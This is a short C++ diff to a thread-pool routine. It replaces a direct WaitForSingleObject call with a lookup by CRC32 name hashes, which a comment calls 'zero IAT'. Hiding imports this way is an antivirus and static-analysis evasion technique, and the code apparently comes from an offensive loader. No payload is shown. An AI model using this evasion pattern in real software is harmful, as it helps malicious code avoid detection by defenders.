@@ -68,9 +68,13 @@ namespace ThreadPool
             // Post the work item — this queues execution in the thread pool
             fnPost(work);
 
-            // Wait for execution to complete (simple approach: wait on event or sleep)
-            // The thread pool will execute our callback asynchronously
-            WaitForSingleObject(GetCurrentThread(), 5000);
+            // Wait for execution to complete via ApiResolver (zero IAT)
+            HMODULE hK32w = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (hK32w) {
+                auto pWFSO = (DWORD(WINAPI*)(HANDLE,DWORD))
+                    Api::GetProcByHashCrc(hK32w, Crc32C::ConstHash("WaitForSingleObject"));
+                if (pWFSO) pWFSO((HANDLE)(LONG_PTR)-2, 5000); // GetCurrentThread() = (HANDLE)-2
+            }
 
             // Release the work item
             fnRelease(work);
